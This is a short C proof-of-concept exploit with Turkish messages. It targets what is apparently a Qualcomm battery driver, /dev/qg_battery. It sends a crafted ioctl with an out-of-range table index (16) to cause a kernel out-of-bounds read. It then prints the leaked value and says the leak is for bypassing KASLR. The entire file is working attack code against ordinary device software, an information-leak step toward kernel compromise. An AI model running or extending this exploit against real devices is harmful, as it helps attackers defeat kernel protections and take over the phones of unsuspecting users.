#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

#define TABLE_MAX 16
#define BPIOCXVAR _IOWR('B', 0x05, struct battery_params)

struct battery_params {
    int soc;
    int ocv_uv;
    int fcc_mah;
    int slope;
    int var;
    int batt_temp;
    int table_index;
};

int main() {
    int fd = open("/dev/qg_battery", O_RDWR);
    if (fd < 0) {
        perror("[-] /dev/qg_battery acilamadi");
        return -1;
    }

    struct battery_params bp;
    memset(&bp, 0, sizeof(bp));

    bp.table_index = TABLE_MAX; // Index 16 (OOB Read)
    bp.batt_temp = 250;
    bp.soc = 5000;

    printf("[+] KASLR bypass icin OOB Read tetikleniyor...\n");
    if (ioctl(fd, BPIOCXVAR, &bp) < 0) {
        perror("[-] IOCTL basarisiz");
    } else {
        printf("[+] Sizdirilan veri (var): 0x%08x\n", bp.var);
    }

    close(fd);
    return 0;
}
